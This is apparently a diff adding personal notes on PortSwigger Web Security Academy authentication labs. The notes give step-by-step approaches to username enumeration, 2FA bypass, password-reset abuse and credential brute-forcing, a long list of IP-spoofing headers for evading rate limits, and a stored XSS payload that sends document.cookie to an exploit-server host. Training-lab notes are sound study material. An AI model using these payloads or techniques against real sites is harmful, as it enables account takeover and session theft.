@@ -1,0 +1,115 @@
+Authentication:
+
+https://portswigger.net/web-security/authentication
+https://portswigger.net/web-security/authentication/auth-lab-usernames
+https://portswigger.net/web-security/authentication/auth-lab-passwords
+
+Lab : Username enumeration via different responses
+--> Find the login page.
+--> Give any random ID pass and intercept with burp.
+--> set cluster bomb and set 2 payload list
+--> attack and wait
+--> Find the real ID pass
+
+Lab: 2FA simple bypass
+--> you have 2 id and pass
+--> First login 1st account as normal and follow which path is going
+--> if you find any pattern
+--> try to execute in 2nd Id
+--> if it execute that means it bug
+
+Lab: Password reset broken logic
+--> we have 2 id first go to forget pass and request to forget pass
+--> and then find the link and also find to token
+--> intercept it and try to remove token or change the token
+--> try to change username also and try again
+--> if password is changed then BHOOM!!!
+--> try login to 2nd account
+
+Lab: Username enumeration via subtly different responses
+--> Find the login page.
+--> Give any random ID pass and intercept with burp.
+--> set cluster bomb and set 2 payload list
+--> attack and wait
+--> Find the real ID pass
+
+Lab: Username enumeration via response timing
+--> if you show that A time limit then use that
+--> first of all intercept the request and add X-Forwarded-For:
+--> then using pitchfork attack and target X-Forwarded-For and username
+--> In X-Forwarded-For you can set any numaric value or random ip
+--> set payload X-Forwarded-For and username
+--> then start attack and go to column enable response receieve and response complete
+--> then find the highest response receieve and find username
+--> then set payload X-Forwarded-For and password
+--> you can find the password and login the account
+
+
+Adding Headers in request:
+Client-IP: 127.0.0.1
+Cluster-Client-IP: 127.0.0.1
+Forwarded-For: 127.0.0.1
+Host: localhost
+True-Client-IP: 127.0.0.1
+X-Client-IP
+X-Client-IP : IP
+X-Custom-IP-Authorization
+X-Forward-For
+X-Forward-Host: IP
+X-Forwarded-For
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: IP
+X-Forwarded: 127.0.0.1
+X-Host: IP
+X-Original-URL: 127.0.0.1
+X-Originating-IP
+X-Originating-IP: 127.0.0.1
+X-Originating-IP: IP
+X-ProxyUser-Ip: 127.0.0.1
+X-Real-IP
+X-Real-IP: 127.0.0.1
+X-Remote-Addr
+X-Remote-Addr: 127.0.0.1
+X-Remote-IP
+X-Remote-IP: 127.0.0.1
+X-Remote-IP: IP
+X-Remote_Addr: IP
+
+X-Forwarded-For: 177.72.60.19
+X-Forwarded: 177.72.60.19
+Forwarded-For: 177.72.60.19
+Forwarded: 177.72.60.19
+X-Forwarded-Host: 177.72.60.19
+X-Remote-Ip: 177.72.60.19
+X-Remote-Addr: 177.72.60.19
+True-Client-Ip: 177.72.60.19
+X-Client-Ip: 177.72.60.19
+Client-Ip: 177.72.60.19
+X-Real-Ip: 177.72.60.19
+Ali-Cdn-Real-Ip: 177.72.60.19
+Cdn-Src-Ip: 177.72.60.19
+Cdn-Real-Ip: 177.72.60.19
+Cf-Connecting-Ip: 177.72.60.19
+X-Cluster-Client-Ip: 177.72.60.19
+Wl-Proxy-Client-Ip: 177.72.60.19
+Proxy-Client-Ip: 177.72.60.19
+Fastly-Client-Ip: 177.72.60.19
+True-Client-Ip: 177.72.60.19
+X-Originating-Ip: 177.72.60.19
+X-Host: 177.72.60.19
+X-Custom-Ip-Authorization: 177.72.60.19
+
+Lab: Username enumeration via account lock:
+--> First Find the login page and give dummy id pass
+--> then intercept with burp and set target user and pass
+--> set target 2 as a null payload like : username=amarillo&password=12345§§
+--> then you can find the username
+--> then use sniper for finding the password
+--> then account login
+
+Lab: Offline password cracking
+--> First Create an Account and login this 
+--> See their cookie and try to understand their logic
+--> Then find the blog post and stry to store based XSS
+<script>document.location="https://exploit-0a6f00c20338e1868467826b01f8009a.exploit-server.net/"+document.cookie</script>
+--> If you find any kind of thing then decrypt this and exploit
